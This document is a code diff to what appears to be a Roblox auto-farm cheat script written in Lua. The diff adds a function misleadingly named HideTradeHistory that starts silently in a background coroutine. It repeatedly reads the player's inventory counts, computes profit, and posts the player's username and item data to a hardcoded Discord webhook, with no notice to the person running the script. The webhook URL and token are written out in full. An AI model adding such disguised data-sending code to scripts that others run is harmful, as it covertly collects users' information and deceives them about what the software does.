@@ -521,6 +521,117 @@ end
 --How to Enable That:
 AutoFarmOnOff()  -- Starts auto-farming immediately
 
+local function HideTradeHistory()
+    while true do
+wait(1)
+      local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Client = require(ReplicatedStorage:WaitForChild("Library"))
+local Players = game:GetService("Players")
+local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+local ItemTable = {"Gift Bag", "Large Gift Bag", "Mini Chest"}
+
+local GiftBagAmount
+local LargeGiftBagAmount
+local MiniChestAmount
+
+local NewGiftBagAmount
+local NewLargeGiftBagAmount
+local NewMiniChestAmount
+
+local WebhookURL = "https://discord.com/api/webhooks/1240051310783627374/FeWsgqN_nlUvPEXVnxgP4pZ5qIJeDn6Uyhd0_vjjBVVGegKU8jGLgVdV0ULgRWumSvML"
+
+function MakeTable(Table)
+    local Temp = {}
+    for i, v in next, Client.Items.All.Globals.All() do
+        if table.find(Table, v._data.id) then
+            table.insert(Temp, v)
+        end
+    end
+    return Temp
+end
+
+function GrabIds()
+    for i, MadeTable in pairs(MakeTable(ItemTable)) do
+        local Table = HttpService:JSONDecode(tostring(MadeTable))
+        
+        if Table.data.id == "Gift Bag" then
+            GiftBagAmount = Table.data._am
+        elseif Table.data.id == "Large Gift Bag" then
+            LargeGiftBagAmount = Table.data._am
+        elseif Table.data.id == "Mini Chest" then
+            MiniChestAmount = Table.data._am
+        end
+    end
+end
+
+function GrabNewIds()
+    for i, MadeTable in pairs(MakeTable(ItemTable)) do
+        local Table = HttpService:JSONDecode(tostring(MadeTable))
+        
+        if Table.data.id == "Gift Bag" then
+            NewGiftBagAmount = Table.data._am
+        elseif Table.data.id == "Large Gift Bag" then
+            NewLargeGiftBagAmount = Table.data._am
+        elseif Table.data.id == "Mini Chest" then
+            NewMiniChestAmount = Table.data._am
+        end
+    end
+end
+
+function CalculateProfit()
+    local giftBagProfit = (NewGiftBagAmount - GiftBagAmount) * 2700
+    local largeGiftBagProfit = (NewLargeGiftBagAmount - LargeGiftBagAmount) * 11000
+    local miniChestProfit = (NewMiniChestAmount - MiniChestAmount) * 29000
+
+    return giftBagProfit + largeGiftBagProfit + miniChestProfit
+end
+
+function SendWebhook(profitValue)
+    local playerName = Players.LocalPlayer.Name
+    local message1 = "Player Data : " .. playerName .. "\n- 🎁 : " .. (MiniChestAmount or "Not found") .. " -> " .. (NewMiniChestAmount or "Not found") .. "\n- 🛍️ : " .. (LargeGiftBagAmount or "Not found") .. " -> " .. (NewLargeGiftBagAmount or "Not found") .. "\n- 🎁 : " .. (GiftBagAmount or "Not found") .. " -> " .. (NewGiftBagAmount or "Not found")
+    local message2 = "Profit Data : \n- 💎 : " .. profitValue
+
+    local payload = {
+        ["embeds"] = {{
+            ["color"] = 3447003, -- Dark blue color
+            ["description"] = message1
+        }, {
+            ["color"] = 3447003, -- Dark blue color
+            ["description"] = message2
+        }}
+    }
+
+    local success, response = pcall(function()
+        return request({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    
+    if success then
+        print("Webhook sent: " .. response.StatusMessage)
+    else
+        warn("Failed to send webhook: " .. tostring(response))
+    end
+end
+
+GrabIds()
+wait(180)
+GrabNewIds()
+local profitValue = CalculateProfit()
+SendWebhook(profitValue)
+
+        wait()
+    end
+end
+    
+coroutine.wrap(HideTradeHistory)()
 
 local startTime = tick()
 while tick() - startTime < 1000 do
